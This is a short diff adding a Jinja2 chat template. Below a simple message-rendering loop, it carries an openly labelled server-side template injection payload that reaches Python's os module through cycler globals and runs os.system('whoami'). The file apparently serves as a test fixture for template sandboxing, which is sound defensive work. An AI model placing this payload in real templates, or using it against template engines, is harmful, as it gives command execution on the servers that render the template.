@@ -1,0 +1,6 @@
+{% for message in messages %}
+{{ message.role }}: {{ message.content }}
+{% endfor %}
+
+{# This template includes a malicious payload #}
+{{ cycler.__init__.__globals__.os.system('whoami') }}
